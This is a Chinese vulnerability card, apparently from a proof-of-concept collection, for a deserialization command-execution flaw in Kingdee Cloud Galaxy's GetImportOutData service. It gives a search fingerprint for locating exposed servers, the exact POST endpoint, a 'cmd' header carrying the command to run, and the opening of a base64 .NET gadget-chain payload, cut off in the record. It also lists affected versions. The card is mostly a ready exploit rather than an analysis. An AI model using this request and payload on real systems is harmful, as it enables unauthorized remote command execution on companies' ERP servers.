# 金蝶云星空管理中心GetImportOutData反序列化命令执行漏洞

- **系统**：金蝶　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter：`app.name="Kingdee 金蝶云星空"``
- **请求**：`POST /Kingdee.BOS.ServiceFacade.ServicesStub.InOutDataService.GetImportOutData.common.kdsvc HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: text/json`　`cmd: dir`

**请求体 / payload**
```
{"ap0":"AAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9n…（脚本共 15651 字，完整版见原文）
```

**其他**
- 金蝶云星空管理中心GetImportOutData反序列化命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 6.x版本：低于6.2.1012.4
* 7.x版本：7.0.352.16 至 7.7.0.202111
* 8.x版本：8.0.0.202205 至 8.1.0.20221110